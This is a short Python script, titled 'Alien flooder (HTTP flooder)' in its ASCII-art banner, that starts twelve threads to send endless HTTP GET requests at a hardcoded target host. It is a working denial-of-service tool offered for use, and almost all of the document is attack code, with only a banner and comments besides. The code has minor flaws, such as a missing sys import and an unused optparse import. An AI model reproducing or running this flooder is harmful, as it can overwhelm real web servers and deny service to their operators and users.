import optparse
import time
import requests
import threading  # modules importationimport requests

def stresser():  # stresser function
    _host = 'http://apache1.willilazarov.cz'
    while (1 < 4):  # infinite loop
        try:
            r = requests.get(_host)  # sending requests
            print(" [*] flooding {} in port 80  ".format(_host))
        except (requests.ConnectionError, requests.HTTPError):  # if host don't exist
            print("[-] host don't exist  ")
            sys.exit()  # exit


def _threads_():  # threading function

    c = threading.Thread(target=stresser)  # creating threads
    d = threading.Thread(target=stresser)
    a = threading.Thread(target=stresser)
    e = threading.Thread(target=stresser)
    z = threading.Thread(target=stresser)
    x = threading.Thread(target=stresser)
    c1 = threading.Thread(target=stresser)
    d1 = threading.Thread(target=stresser)
    a1 = threading.Thread(target=stresser)
    e1 = threading.Thread(target=stresser)
    z1 = threading.Thread(target=stresser)
    x1 = threading.Thread(target=stresser)

    c.start()  # starting threads
    d.start()
    a.start()
    e.start()
    z.start()
    x.start()
    c1.start()
    d1.start()
    a1.start()
    e1.start()
    z1.start()
    x1.start()



def main():  # main function ( most important )

    print("""
********************************
*        _______                 * 
*     .adOOOOOOOOOba.            *
*    dOOOOOOOOOOOOOOOb           *
*   dOOOOOOOOOOOOOOOOOb          *
*  dOOOOOOOOOOOOOOOOOOOb         *
* |OOOOOOOOOOOOOOOOOOOOO|        *
* OP'~"YOOOOOOOOOOOP"~`YO        *
* OO     `YOOOOOP'     OO        *
* OOb      `OOO'      dOO        *
* YOOo      OOO      oOOP        *
*` OOOo     OOO     oOOO'        *
* ` OOOb._,dOOOb._,dOOO'         *
*  ` OOOOOOOOOOOOOOOOO'          *
*    OOOOOOOOOOOOOOOOO           *
*    YOOOOOOOOOOOOOOOP           *
*   ` OOOOOOOOOOOOOOO'           *
*    ` OOOOOOOOOOOOO'            *
*      `OOOOOOOOOOO'             *
*        `~OOOOO~'               *
**********************************
* Alien flooder (HTTP flooder)   *
**********************************      
""")  # ascii code (index)
    print("[*] start flooding ")  # info
    time.sleep(3)  # sleeping
    _threads_()  # threading function start


main()  # main function start